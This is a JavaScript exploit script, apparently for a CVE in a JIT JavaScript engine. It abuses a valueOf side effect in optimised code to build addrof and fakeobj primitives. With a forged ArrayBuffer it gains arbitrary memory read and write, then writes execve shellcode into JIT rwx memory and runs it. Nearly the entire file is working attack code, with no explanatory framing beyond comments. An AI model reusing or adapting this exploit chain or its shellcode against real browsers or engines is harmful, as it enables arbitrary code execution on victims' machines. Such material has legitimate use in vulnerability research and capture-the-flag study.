/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-02-22 18:22:24
 * Author: raycp
 * 
 * Last Modified: 2020-02-23 17:34:36
 * Description: exp for cve-2017-2070
************************************************************/
const MAX_ITERATIONS = 20000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16);
}

// Garbage collection is required to move objects to a stable position in
// memory (OldSpace) before leaking their addresses.
function gc() {
    
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }

}


var flag = 0;
var array1 = [[{}], [1.1]];
var doubleArr1 = [1.1,2.2];

function AddrOfObj1(obj){
    var valueOf = {};
    valueOf.valueOf = function(){
        if(flag == 1){
            array1[1] = doubleArr1;      
        }
        return 1;    
    };
    
    function TriggerVuln(array, obj){

        1+valueOf;
        doubleArr1[0] = 1.1;
        for(var i = 0; i < array.length; i++){
            var arr = array[i];
            arr[0] = obj;
        }
        return doubleArr1[0]
    }
    for(var i = 0;i < MAX_ITERATIONS;i++){
        TriggerVuln(array1, obj);
    }

    flag = 1;
    return f2i(TriggerVuln(array1, obj));
}

/******* memory region
 *
 * ab: ArrayBuffer object to get the address prototype and constructor.
 * fakeABMap: float array to build fake MAP object of ArrayBuffer.
 * fakeAB: float array to build fake ArrayBuffer object.
 * jitObj: jit function to get rwx memory.
 * 
 * must trigger gc to mov the memory to OldSpace to keep the address of memory unchanged during exploitation.
 * 
 * *************/

var ab = new ArrayBuffer(0x200);

var fakeABMap = [
    i2f(0xdaba0000daba0000), // map, whatever;
    i2f(0x000900c03e000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    0,
]

var fakeAB = [
    1.1, // ArrayBuffer Map;
    2.2,  // properties (whatever);
    3.3,  // elements (whatever);
    i2f(0x40000000000), // length 0x400
    4.4, // backing store;
    i2f(0x0000000000000004), // copy form ab stucture
    i2f(0)
]

var jitObj = new Function("var a = 1000000");

// trigger gc to mov the upper data to old space
gc();  
gc();
gc();
gc();

// step 1. get the prototype of ArrayBuffer Map
var abMapProtoAddr = AddrOfObj1(ab.__proto__);
var abMapConstructAddr = abMapProtoAddr - 0x70;
print("[+] ArrayBuffer Map prototype addr: 0x"+hex(abMapProtoAddr));
print("[+] ArrayBuffer Map Constructor addr: 0x"+hex(abMapConstructAddr));
// step 2. use the abMapProtoAddr and abMapConstructAddr to build fake ArrayBuffer Map
fakeABMap[3] = i2f(abMapProtoAddr);
fakeABMap[4] = i2f(abMapConstructAddr);


flag = 0;
var array2 = [[{}], [1.1]];
var doubleArr2 = [1.1,2.2];

function AddrOfObj2(obj){
    var valueOf = {};
    valueOf.valueOf = function(){
        if(flag == 1){
            array2[1] = doubleArr2;      
        }
        return 1;    
    };
    
    function TriggerVuln(array, obj){

        1+valueOf;
        doubleArr2[0] = 1.1;
        for(var i = 0; i < array.length; i++){
            var arr = array[i];
            arr[0] = obj;
        }
        return doubleArr2[0]
    }
    for(var i = 0;i < MAX_ITERATIONS;i++){
        TriggerVuln(array2, obj);
    }

    flag = 1;
    return f2i(TriggerVuln(array2, obj));
}

// step 3. get the fake ArrayBuffer Map elements' addr
var fakeABMapAddr = AddrOfObj2(fakeABMap) + 0x30; // elements addr of fakeABMap
print("[+] fake ArrayBuffer Map addr: 0x"+hex(fakeABMapAddr));
// step 4. use the fakeABMapAddr to build fakeAB;
fakeAB[0] = i2f(fakeABMapAddr);


flag = 0;
var array3 = [[{}], [1.1]];
var doubleArr3 = [1.1,2.2];

function AddrOfObj3(obj){
    var valueOf = {};
    valueOf.valueOf = function(){
        if(flag == 1){
            array3[1] = doubleArr3;      
        }
        return 1;    
    };
    
    function TriggerVuln(array, obj){

        1+valueOf;
        doubleArr3[0] = 1.1;
        for(var i = 0; i < array.length; i++){
            var arr = array[i];
            arr[0] = obj;
        }
        return doubleArr3[0]
    }
    for(var i = 0;i < MAX_ITERATIONS;i++){
        TriggerVuln(array3, obj);
    }

    flag = 1;
    return f2i(TriggerVuln(array3, obj));
}

// step 5. get the fake ArrayBuffer elements' addr
var fakeABAddr = AddrOfObj3(fakeAB) + 0x30 ; // elements addr of fakeAB
print ("[+] fake ArrayBuffer addr: 0x"+hex(fakeABAddr));

flag = 0;
var array4 = [[{}], [1.1]];
var doubleArr4 = [1.1,2.2];

function AddrOfObj4(obj){
    var valueOf = {};
    valueOf.valueOf = function(){
        if(flag == 1){
            array4[1] = doubleArr4;      
        }
        return 1;    
    };
    
    function TriggerVuln(array, obj){

        1+valueOf;
        doubleArr4[0] = 1.1;
        for(var i = 0; i < array.length; i++){
            var arr = array[i];
            arr[0] = obj;
        }
        return doubleArr4[0]
    }
    for(var i = 0;i < MAX_ITERATIONS;i++){
        TriggerVuln(array4, obj);
    }

    flag = 1;
    return f2i(TriggerVuln(array4, obj));
}

// step 6. get the jit obj addr.
var jitObjAddr = AddrOfObj4(jitObj)-1;
print("[+] jit obj addr: 0x"+hex(jitObjAddr));

flag = 0;
var array5 = [[{}], [1.1]];
var doubleArr5 = [1.1,2.2];

function FakeObj(addr){
    var valueOf = {};
    valueOf.valueOf = function(){
        if(flag == 1){
            array5[1] = doubleArr5;      
        }
        return 1;    
    };
    
    function TriggerVuln(array, val){

        1+valueOf;
        doubleArr5[0] = 1.1;
        for(var i = 0; i < array.length; i++){
            var arr = array[i];
            arr[0] = {};
        }
        doubleArr5[1] = val;
        return;
    }
    for(var i = 0;i < MAX_ITERATIONS;i++){
        TriggerVuln(array5, addr);
    }

    flag = 1;
    TriggerVuln(array5, addr);

    return doubleArr5[1];
}

// step 7. get fake ArrayBuffer object with FakeObj primitive
var fakeABObj = FakeObj(i2f(fakeABAddr));
// step 8. build DataView obj
var dataView = new DataView(fakeABObj);

// aar primitive
function dataViewRead64(addr)
{

    fakeAB[4] = addr; // overwrite fakeAB[4], which is corresponding to backing store pointer

    return f2i(dataView.getFloat64(0, true));
}

// aaw primitive
function dataViewWrite(addr, payload)
{

    fakeAB[4] = addr;

    for (let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}



// step 9. leak rwx memory here
var rwxAddr = dataViewRead64(i2f(jitObjAddr+0x38));
print("[+] jit obj addr: 0x"+hex(jitObjAddr));
print("[+] rwx addr: 0x"+hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

// step 10. write shellcode to jit code
dataViewWrite(i2f(rwxAddr), shellcode);
// step 11. trigger jit function to run shellcode
jitObj();

